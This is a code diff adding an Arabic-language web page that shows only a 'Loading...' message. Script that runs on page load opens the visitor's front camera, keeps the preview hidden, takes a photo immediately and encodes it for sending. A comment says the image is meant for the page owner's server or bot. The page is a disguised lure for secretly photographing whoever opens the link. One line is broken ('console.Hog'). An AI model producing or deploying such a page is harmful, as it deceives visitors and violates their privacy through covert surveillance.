@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوت سكران</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        video, canvas {
+            display: none; /* مخفي تماماً عشان يشتغل في السرعة القصوى بدون إظهار معاينة */
+        }
+    </style>
+</head>
+<body>
+
+    <h2>جاري التحميل...</h2>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        async function fastCapture() {
+            try {
+                // طلب فتح الكاميرا الأمامية بأقصى سرعة
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+
+                // أول ما الكاميرا تبدأ تعرض بيانات وجاهزة، صور في نفس اللحظة بدون انتظار
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    
+                    // التقاط الصورة فورا
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تحويل الصورة لبيانات جاهزة للإرسال
+                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // هنا يقدر الكود يبعث الصورة للسيرفر أو البوت الخاص بك فوراً
+                    console.Hog = "تم التقاط الصورة بأقصى سرعة!";
+                    
+                    // إيقاف الكاميرا بعد التقاط الصورة مباشرة لتوفير الطامقة
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+            } catch (err) {
+                console.error("خطأ في تشغيل الكاميرا: ", err);
+            }
+        }
+
+        // تنفيذ الدالة فور فتح الصفحة
+        window.addEventListener('load', fastCapture);
+    </script>
+
+</body>
+</html>
